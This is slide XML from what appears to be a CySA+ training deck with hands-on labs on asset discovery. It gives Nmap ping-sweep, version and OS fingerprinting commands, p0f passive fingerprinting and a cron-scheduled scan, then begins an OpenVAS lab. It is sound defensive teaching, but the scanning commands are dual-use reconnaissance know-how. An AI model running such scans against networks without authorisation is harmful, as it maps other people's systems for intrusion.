              <a:t>–  Random signals to confuse microprobing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Chip casing compromise detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  If compromised, place zeros in nonvolatile memory</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584</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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TOPIC 2 · PRACTICE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Hands-On: Labs 11–19</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9 step-by-step labs applying Vulnerability Management in the Killercoda playground and free tools.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585</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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11 — Asset Discovery with Nmap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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will use Nmap as both an asset-discovery tool and a passive/active fingerprinter. Asset inventory is the first step of every vulnerability management program — you cannot patch what you do not know exists. This maps to CySA+ 2.1 (Asset discovery — Map scans, Device fingerprinting; Internal vs external…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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586</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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11 — Reference Diagram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g_48dc89e0cb.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2673511"/>
            <a:ext cx="10634472" cy="2653978"/>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587</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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11 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install Nmap</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y nmap</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Host discovery (a "map scan")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A map scan answers "what is alive on this subnet?" without a port scan.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ nmap -sn 127.0.0.0/29</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Internal vs external scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Run the same scan against:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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005840" y="468447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05840" y="4684470"/>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30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Active service / version detection (fingerprinting)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-sV probes each open port to identify the service banner.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ nmap -sV -Pn -T4 scanme.nmap.org -p 22,80,443</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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777240" y="5433364"/>
            <a:ext cx="91440" cy="78455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1005840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: OS fingerprinting (active)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-O sends crafted probes and matches TCP/IP stack quirks against its OS database.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Rectangle 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ nmap -O -Pn scanme.nmap.org</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 3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41" name="TextBox 4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2" name="TextBox 4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588</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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11 — Hands-On Steps (cont'd)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01269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01269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05840" y="2060829"/>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2060829"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Passive fingerprinting (alternative)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Active scans are noisy and can trip IDS rules.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2015109"/>
            <a:ext cx="3977639" cy="5486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52360" y="2015109"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt install -y p0f tcpdump</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2923794"/>
            <a:ext cx="10634472" cy="101269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2923794"/>
            <a:ext cx="91440" cy="101269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005840" y="3201543"/>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3201543"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2923794"/>
            <a:ext cx="9509760" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Credentialed vs non-credentialed (concept)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Nmap is non-credentialed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4064508"/>
            <a:ext cx="10634472" cy="101269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240" y="4064508"/>
            <a:ext cx="91440" cy="101269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005840" y="434225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05840" y="4342257"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4064508"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Output formats for the inventory pipeline</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-oA saves three formats simultaneously:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4296537"/>
            <a:ext cx="3977639" cy="5486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452360" y="4296537"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ nmap -sV -Pn scanme.nmap.org -p 80,443 -oA /tmp/scan_inventory</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5205222"/>
            <a:ext cx="10634472" cy="101269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77240" y="5205222"/>
            <a:ext cx="91440" cy="101269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005840" y="5482971"/>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05840" y="5482971"/>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30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5205222"/>
            <a:ext cx="5486400" cy="1012698"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Schedule a recurring scan (Special considerations)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CySA+ 2.1 lists "Scheduling, Operations, Performance, Sensitivity, Segmentation, Regulatory" as scan considerations.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5437251"/>
            <a:ext cx="3977639" cy="5486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452360" y="5437251"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ echo "0 2 * * * root nmap -sn 10.0.0.0/24 -oG /var/log/asset-inventory-\</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 3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34" name="TextBox 3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5" name="TextBox 3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589</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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11 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Run a ping-sweep map scan and version/OS fingerprint with Nmap.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The difference between active (Nmap) and passive (p0f) fingerprinting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Internal vs external scan scope.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  How to output Nmap data for pipeline consumption and schedule it.</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590</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Lab 12 — Vulnerability Scanning with OpenVAS (Greenbone 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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will run a full credentialed vulnerability scan with OpenVAS / Greenbone Community Edition, the free alternative to Nessus and Qualys. This maps directly to CySA+ 2.2 (Vulnerability scanners — Nessus, OpenVAS) and 2.1 (Agent vs agentless, Credentialed vs non-credentialed, Industry frameworks).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Local VM — Greenbone Community Edition (VirtualBox/VMware)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591</a:t>
            </a:r>
          </a:p>
        </p:txBody>
